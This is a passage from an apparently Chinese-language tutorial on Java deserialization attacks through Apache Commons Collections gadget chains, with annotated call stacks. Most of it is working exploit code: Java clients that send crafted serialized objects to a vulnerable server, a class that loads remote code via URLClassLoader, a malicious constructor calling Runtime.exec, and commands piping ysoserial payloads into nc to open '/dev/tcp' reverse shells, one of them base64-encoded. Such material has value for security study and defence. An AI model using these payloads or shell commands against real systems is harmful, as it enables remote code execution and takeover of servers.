                },
                new Object[]
                {
                    "newInstance",
                    new Class[]
                    {
                        URL[].class
                    }
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[]
                    {
                        new URL[]
                        {
                            new URL( evilurl )
                        }
                    }
                }
            ),
            new InvokerTransformer
            (
                "loadClass",
                new Class[]
                {
                    String.class
                },
                new Object[]
                {
                    evilclass
                }
            ),
            new InvokerTransformer
            (
                "getDeclaredConstructor",
                new Class[]
                {
                    Class[].class
                },
                new Object[]
                {
                    new Class[]
                    {
                        Object[].class
                    }
                }
            ),
            new InvokerTransformer
            (
                "newInstance",
                new Class[]
                {
                    Object[].class
                },
                new Object[]
                {
                    new Object[]
                    {
                        evilparam
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        tme.hashCode();
    }
}
```

8.6.5) 测试EvilURLClassLoaderWithTransformer

假设目录结构是:

.
|
+---test0
|
+---test1
|       ConnectShellEx.class
|
\---test2
        EvilURLClassLoader.class
        commons-collections-3.1.jar

在test0目录执行:

nc -l -p 7474

在test1目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test2目录执行:

java \
-cp "commons-collections-3.1.jar:." \
EvilURLClassLoaderWithTransformer http://192.168.65.23:8080/ ConnectShellEx 192.168.65.23 7474

调试EvilURLClassLoaderWithTransformer:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
EvilURLClassLoaderWithTransformer http://192.168.65.23:8080/ ConnectShellEx 192.168.65.23 7474

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in ConnectShellEx.<init>

  [1] ConnectShellEx.<init> (ConnectShellEx.java:9), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [6] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [7] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [8] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [9] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [10] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [11] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [12] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [13] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
  [14] org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode (TiedMapEntry.java:120), pc = 1
  [15] EvilURLClassLoaderWithTransformer.main (EvilURLClassLoaderWithTransformer.java:113), pc = 289

8.6.6) EvilURLClassLoaderWithConcurrentHashMap.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilURLClassLoaderWithConcurrentHashMap.java
 */
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.lang.reflect.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class EvilURLClassLoaderWithConcurrentHashMap
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        String          evilurl     = argv[2];
        String          evilclass   = argv[3];
        String[]        evilparam   = Arrays.copyOfRange
        (
            argv,
            4,
            argv.length
        );

        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( URLClassLoader.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "newInstance",
                    new Class[]
                    {
                        URL[].class
                    }
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[]
                    {
                        new URL[]
                        {
                            new URL( evilurl )
                        }
                    }
                }
            ),
            new InvokerTransformer
            (
                "loadClass",
                new Class[]
                {
                    String.class
                },
                new Object[]
                {
                    evilclass
                }
            ),
            new InvokerTransformer
            (
                "getDeclaredConstructor",
                new Class[]
                {
                    Class[].class
                },
                new Object[]
                {
                    new Class[]
                    {
                        Object[].class
                    }
                }
            ),
            new InvokerTransformer
            (
                "newInstance",
                new Class[]
                {
                    Object[].class
                },
                new Object[]
                {
                    new Object[]
                    {
                        evilparam
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        ConcurrentHashMap
                        chm         = new ConcurrentHashMap( 1 );
        chm.put( "key", "value" );
        Field           f           = ConcurrentHashMap.class.getDeclaredField( "table" );
        f.setAccessible( true );
        Object[]        table       = ( Object[] )f.get( chm );
        Object          node        = table[1];
        if ( node == null )
        {
            node    = table[0];
        }
        Field           k           = node.getClass().getDeclaredField( "key" );
        k.setAccessible( true );
        k.set( node, tme );
        Socket          s_connect   = new Socket( addr, port );
        ObjectOutputStream
                        oos         = new ObjectOutputStream( s_connect.getOutputStream() );
        oos.writeObject( chm );
        oos.close();
        s_connect.close();
    }
}
```

8.6.7) 测试EvilURLClassLoaderWithConcurrentHashMap

假设目录结构是:

.
|
+---test0
|
+---test1
|       ConnectShellEx.class
|
+---test2
|       VulnerableServer.class
|       commons-collections-3.1.jar
|
\---test3
        EvilURLClassLoaderWithConcurrentHashMap.class
        commons-collections-3.1.jar

在test0目录执行:

nc -l -p 7474

在test1目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test2目录执行:

java \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

在test3目录执行:

java \
-cp "commons-collections-3.1.jar:." \
EvilURLClassLoaderWithConcurrentHashMap 192.168.65.23 1414 http://192.168.65.23:8080/ ConnectShellEx 192.168.65.23 7474

回到前面那个nc，已经得到一个shell，其uid对应VulnerableServer进程的euid。可
以在这个shell里执行"ps -f -o pid,user,args"看看:

   PID USER     COMMAND
 14887 scz      -bash
 14941 scz       \_ java -cp commons-collections-3.1.jar:. VulnerableServer 192.168.65.23 1414
 14961 scz           \_ /bin/sh -c /bin/sh -i > /dev/tcp/192.168.65.23/7474  0<&1 2>&1
 14962 scz               \_ /bin/sh -i
 14964 scz                   \_ ps -f -o pid,user,args

VulnerableServer使用8u232时可以得手，不要求服务端使用8u40。

调试VulnerableServer:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in ConnectShellEx.<init>

  [1] ConnectShellEx.<init> (ConnectShellEx.java:9), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [6] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [7] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [8] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [9] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [10] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [11] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [12] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [13] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
  [14] org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode (TiedMapEntry.java:120), pc = 1
  [15] java.util.concurrent.ConcurrentHashMap.readObject (ConcurrentHashMap.java:1,447), pc = 42
  [16] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [17] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [18] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [19] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [20] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [21] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [22] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [23] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [24] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [25] VulnerableServer.main (VulnerableServer.java:22), pc = 51

有几个问题要说一下。ConnectShellEx可以换成任意其他恶意类。evilurl可以用jar
包的方式。恶意代码不一定要在恶意类的构造函数里，可以在恶意类的某个成员函数
里，需要将对getDeclaredConstructor()的调用改成对getMethod()的调用。如果只
是想得到"connect shell"，不需要用EvilURLClassLoaderWithConcurrentHashMap，
用EvilClientWithConcurrentHashMap就可以:

nc -l -p 7474

java \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

java \
-cp "commons-collections-3.1.jar:." \
EvilClientWithConcurrentHashMap 192.168.65.23 1414 "/bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1"

用EvilURLClassLoaderWithConcurrentHashMap的好处是恶意类用Java实现，可以很
复杂，可以上Java版远控。

8.7) BadAttributeValueExpException利用链

这条利用链本质上是TiedMapEntry利用链。这次不从易到难了，套路都差不多，该强
调的都强调过，直接上反序列化攻击链版本。

8.7.1) EvilClientWithBadAttributeValueExpException.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilClientWithBadAttributeValueExpException.java
 */
import java.io.*;
import java.net.Socket;
import java.util.*;
import java.lang.reflect.*;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

public class EvilClientWithBadAttributeValueExpException
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        String          cmd         = argv[2];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        BadAttributeValueExpException
                        bave        = new BadAttributeValueExpException( null );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/lang/Object.html
         *
         * Class<?> getClass()
         *
         * https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
         *
         * Field getDeclaredField(String name)
         *
         * 也可以写"BadAttributeValueExpException.class.getDeclaredField()"
         */
        Field           f           = bave.getClass().getDeclaredField( "val" );
        f.setAccessible( true );
        f.set( bave, tme );
        /*
         * 发送序列化数据
         */
        Socket          s_connect   = new Socket( addr, port );
        ObjectOutputStream
                        oos         = new ObjectOutputStream( s_connect.getOutputStream() );
        oos.writeObject( bave );
        oos.close();
        s_connect.close();
    }
}
```

EvilClientWithBadAttributeValueExpException.java
与EvilClientWithConcurrentHashMap.java很接近，前者数据准备部分更简捷。数据
准备部分的原始意图是:

bave    = new BadAttributeValueExpException( tme );

为什么不直接这么写呢？

```java
*
 * 用JD-GUI看8u232的rt.jar
 */
  public BadAttributeValueExpException(Object val)
  {
/*
 * 59行。如果形参是tme，this.val将被赋值成tme.toString()。这有两个问题，一
 * 是TiedMapEntry.toString()在数据准备阶段就被调用，最终到达LazyMap.get()，
 * 这不是期望行为；二是将来反序列化时看不到TiedMapEntry，看到的是String，
 * 无法触发LazyMap.get()。
 */
    this.val = (val == null ? null : val.toString());
  }
```

一般来说数据准备阶段通过反射方式设置private成员变量都是有原因的，不是心血
来潮。

nc -l -p 7474

java \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

java \
-cp "commons-collections-3.1.jar:." \
EvilClientWithBadAttributeValueExpException 192.168.65.23 1414 "/bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1"

ps -f -o pid,user,args

调试VulnerableServer:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.toString (TiedMapEntry.java:131), pc = 20
  [11] javax.management.BadAttributeValueExpException.readObject (BadAttributeValueExpException.java:86), pc = 97
  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [15] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [20] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [21] VulnerableServer.main (VulnerableServer.java:22), pc = 51

8.7.2) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  BadAttributeValueExpException.readObject
    TiedMapEntry.toString   // TiedMapEntry.hashCode()、TiedMapEntry.toString
                            // 都会调用TiedMapEntry.getValue()
      TiedMapEntry.getValue
        LazyMap.get         // 此处开始LazyMap利用链
--------------------------------------------------------------------------

8.7.3) ysoserial/CommonsCollections5

参[52]，可以用ysoserial生成使用BadAttributeValueExpException利用链的序列化
数据。

参:

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java

java \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 "/bin/touch /tmp/scz_is_here" | nc -n 192.168.65.23 1414

CommonsCollections5用的是exec(String)，不是exec(String[])。如果想弄个shell，
只能用些别的奇技淫巧，比如:

nc -l -p 7474

java \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \
"bash -c {echo,L2Jpbi9zaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguNjUuMjMvNzQ3NCAwPCYxIDI+JjE=}|{base64,-d}|{bash,}" \
| nc -n 192.168.65.23 1414

或者

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \
'sh -c $@|sh any echo /bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1' \
| nc -n 192.168.65.23 1414

是不是已经看晕了？没晕的说明你是老司机，晕了的不要提问。ReflectExec.java中
有个注释，写的是"不要问我为什么不用exec(String command)"。

8.8) TemplatesImpl利用链

com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl

8.8.1) JacksonExploit.java

同CVE-2017-7525所用JacksonExploit.java，必须是AbstractTranslet的子类。

```java
*
 * javac -encoding GBK -g -XDignore.symbol.file JacksonExploit.java
 *
 * 为了抑制这个编译时警告，Java 8可以指定"-XDignore.symbol.file"
 *
 * warning: AbstractTranslet is internal proprietary API and may be removed in a future release
 */
import java.io.*;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/*
 * 必须是public，否则不能成功执行命令
 */
public class JacksonExploit extends AbstractTranslet
{
    /*
     * 必须是public
     */
    public JacksonExploit ()
    {
        try
        {
            System.out.println( "scz is here" );
            Runtime.getRuntime().exec( new String[] { "/bin/bash", "-c", "/bin/touch /tmp/scz_is_here" } );
        }
        catch ( IOException e )
        {
            e.printStackTrace();
        }
    }

    /*
     * 必须重载这两个抽象方法，否则编译时报错
     */
    @Override
    public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler )
    {
    }

    @Override
    public void transform ( DOM document, SerializationHandler[] handler )
    {
    }
}
```

8.8.2) TemplatesImplExec.java

这是个单机版，ConcurrentHashMapExec.java也是单机版。

```java
*
 * javac -encoding GBK -g -XDignore.symbol.file -cp "commons-collections4-4.0.jar" TemplatesImplExec.java
 * java -cp "commons-collections4-4.0.jar:." TemplatesImplExec JacksonExploit.class
 *
 * warning: TemplatesImpl is internal proprietary API and may be removed in a future release
 *
 * 为了抑制这个编译时警告，Java 8可以指定"-XDignore.symbol.file"
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.*;
import org.apache.commons.collections4.comparators.TransformingComparator;

public class TemplatesImplExec
{
    /*
     * 全部是Java 8自带类，不依赖第三方库。返回值完全等同于:
     *
     * base64 -w 0 JacksonExploit.class
     *
     * 单行BASE64编码字符串
     */
    // private static String GenerateBase64 ( String filename ) throws IOException
    // {
    //     /*
    //      * https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html
    //      */
    //     return
    //     (
    //         Base64.getEncoder().encodeToString
    //         (
    //             Files.readAllBytes
    //             (
    //                 ( new File( filename ) ).toPath()
    //             )
    //         )
    //     );
    // }

    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          evilclass   = argv[0];
        /*
         * 与CVE-2017-7525不同，此处不要BASE64编码，因为我们将直接设置
         * _bytecodes
         */
        byte[]          evilbyte    = Files.readAllBytes( ( new File( evilclass ) ).toPath() );
        TemplatesImpl   ti          = new TemplatesImpl();
        /*
         * 真正有用的是_bytecodes，但_tfactory、_name为null时没机会让
         * _bytecodes得到执行，中途就会抛异常。
         */
        Field           _bytecodes  = TemplatesImpl.class.getDeclaredField( "_bytecodes" );
        _bytecodes.setAccessible( true );
        _bytecodes.set( ti, new byte[][] { evilbyte }  );
        Field           _tfactory   = TemplatesImpl.class.getDeclaredField( "_tfactory" );
        _tfactory.setAccessible( true );
        _tfactory.set( ti, new TransformerFactoryImpl() );
        Field           _name       = TemplatesImpl.class.getDeclaredField( "_name" );
        _name.setAccessible( true );
        /*
         * 第二形参可以是任意字符串，比如空串，但不能是null
         */
        _name.set( ti, "" );
        /*
         * 将来会调用TemplatesImpl.newTransformer()
         */
        Transformer     it          = new InvokerTransformer( "newTransformer", new Class[0], new Object[0] );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/util/PriorityQueue.html
         * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/util/PriorityQueue.java
         *
         * PriorityQueue(int initialCapacity, Comparator<? super E> comparator)
         *
         * TransformingComparator在3.1至3.2.1版本中尚未实现Serializable接
         * 口，无法被序列化。4.0中实现了Serializable接口。
         */
        PriorityQueue   pq          = new PriorityQueue( 2, null );
        /*
         * pq.add()会触发如下调用:
         *
         * PriorityQueue.add
         *   PriorityQueue.offer
         *     PriorityQueue.siftUp
         *       PriorityQueue.siftUpUsingComparator
         *         TransformingComparator.compare
         *           InvokerTransformer.transform
         *
         * 所以我在pq.add()之后利用反射方式设置comparator，避免
         * InvokerTransformer.transform()被提前调用。
         *
         * 两个占位
         */
        pq.add( 0 );
        pq.add( 1 );
        Field           comparator  = PriorityQueue.class.getDeclaredField( "comparator" );
        comparator.setAccessible( true );
        /*
         * InvokerTransformer是通过comparator触发的
         */
        comparator.set( pq, new TransformingComparator( it ) );
        Field           q           = PriorityQueue.class.getDeclaredField( "queue" );
        q.setAccessible( true );
        Object[]        queue       = ( Object[] )q.get( pq );
        queue[0]                    = ti;
        /*
         * 用内存做中转站
         */
        ByteArrayOutputStream
                        bos         = new ByteArrayOutputStream();
        ObjectOutputStream
                        oos         = new ObjectOutputStream( bos );
        oos.writeObject( pq );
        ByteArrayInputStream
                        bis         = new ByteArrayInputStream( bos.toByteArray() );
        ObjectInputStream
                        ois         = new ObjectInputStream( bis );
        /*
         * 通过反序列化PriorityQueue触发TemplatesImpl.newTransformer()
         */
        ois.readObject();
    }
}
```

执行时会抛出异常，但恶意构造函数已被执行。

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections4-4.0.jar:." \
TemplatesImplExec JacksonExploit.class

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in JacksonExploit.<init>

  [1] JacksonExploit.<init> (JacksonExploit.java:23), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [6] java.lang.Class.newInstance (Class.java:442), pc = 138
  [7] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance (TemplatesImpl.java:455), pc = 29
  [8] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer (TemplatesImpl.java:486), pc = 5
  [9] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [10] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [11] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [12] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [13] org.apache.commons.collections4.functors.InvokerTransformer.transform (InvokerTransformer.java:129), pc = 30
  [14] org.apache.commons.collections4.comparators.TransformingComparator.compare (TransformingComparator.java:81), pc = 5
  [15] java.util.PriorityQueue.siftDownUsingComparator (PriorityQueue.java:722), pc = 83
  [16] java.util.PriorityQueue.siftDown (PriorityQueue.java:688), pc = 10
  [17] java.util.PriorityQueue.heapify (PriorityQueue.java:737), pc = 21
  [18] java.util.PriorityQueue.readObject (PriorityQueue.java:797), pc = 62
  [19] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [20] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [21] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [22] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [23] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [24] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [25] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [26] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [27] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [28] TemplatesImplExec.main (TemplatesImplExec.java:126), pc = 277

8.8.3) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  PriorityQueue.readObject
    PriorityQueue.heapify
      TransformingComparator.compare                // 通过优先队列的比较器触发
                                                    // 比较器是TransformingComparator
        InvokerTransformer.transform                // 没有用ChainedTransformer
          TemplatesImpl.newTransformer
            TemplatesImpl.getTransletInstance
              return null                           // if (this._name == null)
                                                    // 如果this._name等于null，在此直接返回，没有机会初始化恶意class实例
                                                    // 为了攻击成功，必须设法让this._name不等于null，可以为空串
              TemplatesImpl.defineTransletClasses   // 在此将this._bytecodes转换成this._class[]，即加载类
                _tfactory.getExternalExtensionsMap  // 如果this._tfactory等于null，在此抛出异常
                superClass.getName().equals(ABSTRACT_TRANSLET)
                                                    // 加载_bytecodes成功后，检查其父类是否是AbstractTranslet
                                                    // 必须满足该条件，否则在恶意构造函数被执行之前就抛异常
              Class.newInstance                     // (AbstractTranslet)this._class[this._transletIndex].newInstance()
                JacksonExploit.<init>
                  Runtime.exec
--------------------------------------------------------------------------

在Jackson(CVE-2017-7525)、Fastjson的TemplatesImpl利用链中有:

--------------------------------------------------------------------------
TemplatesImpl.getOutputProperties
  TemplatesImpl.newTransformer
    ...
--------------------------------------------------------------------------

这次TemplatesImpl.newTransformer()是由InvokerTransformer.transform()触发的。
这次可以直接指定_tfactory，所以8u232可以得手。

参[54]，对java.util.PriorityQueue来点感性认识，这是个可以指定比较器的队列。
攻击代码用的比较器是TransformingComparator。

8.8.4) ysoserial/CommonsCollections2

参[52]，可以用ysoserial生成使用TemplatesImpl利用链的序列化数据。不能用于
3.1至3.2.1，可以用于4.0，原因是TransformingComparator在3.1至3.2.1版本中尚
未实现Serializable接口，无法被序列化，4.0中其实现了Serializable接口。

测试:

nc -l -p 7474

java \
-cp "commons-collections4-4.0.jar:." \
VulnerableServer 192.168.65.23 1414

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 \
'sh -c $@|sh any echo /bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1' \
| nc -n 192.168.65.23 1414

参:

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java

有句代码:

final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

如果没有调试过，你可能会有个疑问，为什么第一形参要指定成"toString"？有如下
调用关系:

PriorityQueue.add
  PriorityQueue.offer
    PriorityQueue.siftUp
      PriorityQueue.siftUpUsingComparator
        TransformingComparator.compare
          InvokerTransformer.transform
            Integer.toString

执行PriorityQueue.add()时会调用Integer.toString()，这是个无害函数，调就调
了，没啥副作用。CommonsCollections2后面用反射方式将"toString"改成了
"newTransformer":

Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

我则是一上来就将第一形参指定成"newTransformer"，但生成PriorityQueue对象时
没有指定比较器，从而避免Integer.newTransformer()这种不可能成功的调用企图。
然后在占位成功后用反射方式设置比较器。这两种方式都可以，明白为什么即可。

参看"8.8.14) ysoserial/CommonsBeanutils1"小节的类似讨论。

8.8.5) TemplatesImplExecWithTrAXFilter.java

对应"ysoserial/CommonsCollections3"，这是个单机版。

```java
*
 * javac -encoding GBK -g -XDignore.symbol.file -cp "commons-collections-3.1.jar" TemplatesImplExecWithTrAXFilter.java
 * java_8_40 -cp "commons-collections-3.1.jar:." TemplatesImplExecWithTrAXFilter JacksonExploit.class
 *
 * warning: TrAXFilter is internal proprietary API and may be removed in a future release
 *
 * 为了抑制这个编译时警告，Java 8可以指定"-XDignore.symbol.file"
 */
import java.io.*;
import java.net.Socket;
import java.util.*;
import java.lang.reflect.*;
import java.lang.annotation.*;
import java.nio.file.Files;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import javax.xml.transform.Templates;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

/*
